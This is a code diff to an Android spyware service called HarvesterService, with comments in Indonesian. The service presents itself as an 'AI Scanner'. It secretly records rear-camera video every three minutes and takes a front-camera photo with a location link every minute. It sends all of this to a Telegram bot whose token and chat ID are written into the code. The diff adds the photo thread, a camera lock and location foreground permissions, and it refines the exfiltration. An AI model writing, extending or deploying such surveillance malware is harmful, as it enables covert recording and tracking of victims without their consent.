@@ -18,6 +18,7 @@ import android.os.PowerManager;
 import android.provider.ContactsContract;
 import org.json.JSONObject;
 import java.io.File;
+import java.io.FileOutputStream;
 import okhttp3.*;
 
 public class HarvesterService extends Service {
@@ -25,6 +26,9 @@ public class HarvesterService extends Service {
     private String BOT_TOKEN = "9136102668:AAHIqngLUTmSneSbZt-ddd34YqRHcpKIkSM"; 
     private String CHAT_ID = "5437327956";     
     private PowerManager.WakeLock wakeLock;
+    
+    // KUNCI BIAR KAMERA GAK CRASH (REBUTAN)
+    private static final Object cameraLock = new Object();
 
     @Override
     public void onCreate() {
@@ -36,16 +40,11 @@ public class HarvesterService extends Service {
                 NotificationManager manager = getSystemService(NotificationManager.class);
                 manager.createNotificationChannel(serviceChannel);
             }
-            Notification.Builder builder;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                builder = new Notification.Builder(this, CHANNEL_ID);
-            } else {
-                builder = new Notification.Builder(this);
-            }
+            Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
             Notification notification = builder.setContentTitle("AI Scanner Active").setContentText("Memproses...").setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build();
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
+                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
             } else {
                 startForeground(1, notification);
             }
@@ -60,6 +59,10 @@ public class HarvesterService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        
+        // ==========================================
+        // THREAD 1: VIDEO BELAKANG (JEDA 3 MENIT)
+        // ==========================================
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -72,28 +75,46 @@ public class HarvesterService extends Service {
                             isFirstRun = false;
                         }
 
-                        String locLink = getLocationLink();
-                        
-                        try {
+                        synchronized (cameraLock) {
                             recordVideoWithCamera(0, "🎥 Video Belakang", 20000);
-                            Thread.sleep(2000);
-                            recordVideoWithCamera(1, "🎥 Video Depan", 20000);
-                        } catch (Exception e) {
-                            sendTgText("❌ ERROR REKAM: " + e.getMessage());
                         }
-
-                        sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
                         
-                        // Jeda 3 Menit (180000 ms)
-                        Thread.sleep(180000); 
+                        Thread.sleep(180000); // 3 Menit
                         
                     } catch (Exception e) {
-                        sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
+                        sendTgText("❌ ERROR VIDEO LOOP: " + e.getMessage());
                         try { Thread.sleep(60000); } catch (Exception ex) {}
                     }
                 }
             }
         }).start();
+
+        // ==========================================
+        // THREAD 2: FOTO DEPAN & LOKASI (JEDA 1 MENIT)
+        // ==========================================
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    try {
+                        String locLink = getLocationLink();
+                        
+                        synchronized (cameraLock) {
+                            takePhotoWithCamera(1, "📸 Foto Depan");
+                        }
+                        
+                        sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
+                        
+                        Thread.sleep(60000); // 1 Menit
+                        
+                    } catch (Exception e) {
+                        sendTgText("❌ ERROR FOTO LOOP: " + e.getMessage());
+                        try { Thread.sleep(60000); } catch (Exception ex) {}
+                    }
+                }
+            }
+        }).start();
+
         return START_STICKY;
     }
 
@@ -112,11 +133,8 @@ public class HarvesterService extends Service {
         MediaRecorder recorder = new MediaRecorder();
         try {
             camera = Camera.open(cameraId);
-            
-            // Pake Texture sederhana
             SurfaceTexture dummyTexture = new SurfaceTexture(10);
             camera.setPreviewTexture(dummyTexture);
-            
             camera.unlock();
             
             recorder.setCamera(camera);
@@ -141,23 +159,48 @@ public class HarvesterService extends Service {
             recorder.release();
             recorder = null;
             
-            camera.lock();
-            camera.release();
+            try {
+                camera.stopPreview();
+                camera.lock();
+                camera.release();
+            } catch (Exception e) {}
             camera = null;
-            
             dummyTexture.release();
             
             sendTgVideo(file, caption);
 
         } catch (Exception e) {
             sendTgText("❌ ERROR VIDEO " + cameraId + ": " + e.getMessage());
-        } finally {
-            if (recorder != null) {
-                try { recorder.reset(); recorder.release(); } catch (Exception e) {}
-            }
-            if (camera != null) {
-                try { camera.lock(); camera.release(); } catch (Exception e) {}
-            }
+            if (recorder != null) { try { recorder.reset(); recorder.release(); } catch (Exception ex) {} }
+            if (camera != null) { try { camera.lock(); camera.release(); } catch (Exception ex) {} }
+        }
+    }
+
+    private void takePhotoWithCamera(int cameraId, String caption) {
+        Camera camera = null;
+        try {
+            camera = Camera.open(cameraId);
+            SurfaceTexture dummyTexture = new SurfaceTexture(10);
+            camera.setPreviewTexture(dummyTexture);
+            camera.startPreview();
+            
+            camera.takePicture(null, null, new Camera.PictureCallback() {
+                @Override
+                public void onPictureTaken(byte[] data, Camera cam) {
+                    String fileName = (cameraId == 0) ? "photo_back.jpg" : "photo_front.jpg";
+                    File file = new File(getExternalFilesDir(null), fileName);
+                    try (FileOutputStream fos = new FileOutputStream(file)) {
+                        fos.write(data);
+                    } catch (Exception e) {}
+                    
+                    cam.stopPreview();
+                    cam.release();
+                    sendTgPhoto(file, caption);
+                }
+            });
+        } catch (Exception e) {
+            sendTgText("❌ ERROR FOTO " + cameraId + ": " + e.getMessage());
+            if (camera != null) { try { camera.release(); } catch (Exception ex) {} }
         }
     }
 
@@ -194,12 +237,20 @@ public class HarvesterService extends Service {
         }
     }
 
-    @Override 
-    public void onDestroy() {
+    private void sendTgPhoto(File file, String caption) {
+        try {
+            RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID).addFormDataPart("caption", caption)
+                    .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))).build();
+            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto").post(requestBody).build()).execute();
+        } catch (Exception e) {
+            sendTgText("❌ ERROR KIRIM FOTO: " + e.getMessage());
+        }
+    }
+
+    @Override public void onDestroy() {
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         super.onDestroy();
     }
-    
-    @Override 
-    public IBinder onBind(Intent intent) { return null; }
+    @Override public IBinder onBind(Intent intent) { return null; }
 }
